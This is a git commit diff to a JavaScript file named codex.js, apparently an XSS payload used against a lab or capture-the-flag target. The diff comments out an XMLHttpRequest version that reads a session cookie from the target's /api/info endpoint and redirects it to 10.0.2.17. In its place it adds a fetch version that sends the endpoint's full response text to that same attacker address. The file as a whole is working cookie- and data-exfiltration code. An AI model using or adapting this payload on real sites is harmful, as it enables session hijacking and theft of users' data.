a0849c4e0c7677a9fb6e50b48a986b3d43a30b54
EsevKa <139042999+Esevka@users.noreply.github.com>
2025-04-22 17:34:43 +0200

    Update codexx.js

--- codex.js
+++ codex.js
@@ -1,18 +1,15 @@
-// fetch('https://guitjapeo.thl/api/info')
-//         .then(resp => resp.text())
-//         .then(text => {
-//                 fetch(`http://10.0.2.17/?exfil=${text}`);
-//         })
-//         .catch(err => {
-//                 fetch(`http://10.0.2.17/?error=${err}`);
-//         });
-var req = new XMLHttpRequest();
-req.onload=reqListener;
-var url="https://guitjapeo.thl/api/info";
-req.withCredentials=true;
-req.open("GET",url,false);
-req.send();
-function reqListener() {
-    const sess=JSON.parse(this.responseText).cookie;
-    location.href="http://10.0.2.17/?data="+sess;
-};
+fetch('https://guitjapeo.thl/api/info')
+        .then(resp => resp.text())
+        .then(text => {
+                fetch('http://10.0.2.17/?exfil='+text);
+        });
+// var req = new XMLHttpRequest();
+// req.onload=reqListener;
+// var url="https://guitjapeo.thl/api/info";
+// req.withCredentials=true;
+// req.open("GET",url,false);
+// req.send();
+// function reqListener() {
+//     const sess=JSON.parse(this.responseText).cookie;
+//     location.href="http://10.0.2.17/?data="+sess;
+// };
